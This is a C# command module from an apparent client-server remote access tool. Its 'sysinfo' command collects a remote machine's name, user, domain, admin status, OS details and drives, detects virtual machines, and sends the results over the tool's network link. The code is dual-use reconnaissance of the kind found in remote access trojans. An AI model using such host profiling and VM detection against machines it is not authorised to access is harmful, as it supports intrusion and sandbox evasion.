using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;

namespace Commands
{
    internal class SysInfo : ICommand
    {
        public string name { get; } = "sysinfo";

        public string description { get; } = "Display the remote system's informations";

        public string syntaxHelper { get; } = "sysinfo";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = null;


        public bool PreProcessCommand(List<string> args)
        {
            throw new NotImplementedException();
        }

        public void ClientMethod(List<string> args)
        {
            var data = "";
            while (data != "{end}")
            {
                if (data != "")
                    Console.WriteLine(data);
                data = CommandsManager.networkManager.ReadLine();
            }
        }

        public void ServerMethod(List<string> args)
        {
            var infos = new List<Tuple<string, string>>
            {
                new Tuple<string, string>("Machine name", Environment.MachineName),
                new Tuple<string, string>("Virtual machine", IsVirtualMachine() ? "Yes" : "No"),
                new Tuple<string, string>("Current user's name", Environment.UserName),
                new Tuple<string, string>("Current user's domain name", Environment.UserDomainName),
                new Tuple<string, string>("Admin", IsAdministrator() ? "Administrator" : "Not administrator"),
                new Tuple<string, string>("Os version", $"{Environment.OSVersion} , {(Environment.Is64BitOperatingSystem ? "64" : "32")}bit operating system"),
                new Tuple<string, string>(".NET version", Environment.Version.ToString()),
                new Tuple<string, string>("Processor cores", Environment.ProcessorCount.ToString()),
                new Tuple<string, string>("Machine uptime", TimespanAsString(TimeSpan.FromMilliseconds(Environment.TickCount))),
                new Tuple<string, string>("Drives", Environment.GetLogicalDrives().Aggregate((current, drive) => $"{current} , " + drive))
            };

            CommandsManager.networkManager.WriteLine(CommandsManager.TableDisplay(infos));
            CommandsManager.networkManager.WriteLine("{end}");
        }

        string TimespanAsString(TimeSpan t)
        {
            string result;

            if (t.TotalMinutes < 1.0)
            {
                result = $"{t.Seconds}s";
            }
            else if (t.TotalHours < 1.0)
            {
                result = $"{t.Minutes}m:{t.Seconds:D2}s";
            }
            else
            {
                result = $"{(int)t.TotalHours}h:{t.Minutes:D2}m:{t.Seconds:D2}s";
            }

            return result;
        }

        public bool IsVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        var manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }

                        // Check "HypervisorPresent" property, which is available in some cases.
                        var hypervisorPresentProperty = item.Properties
                            .OfType<PropertyData>()
                            .FirstOrDefault(p => p.Name == "HypervisorPresent");

                        if ((bool?)hypervisorPresentProperty?.Value == true)
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        public bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
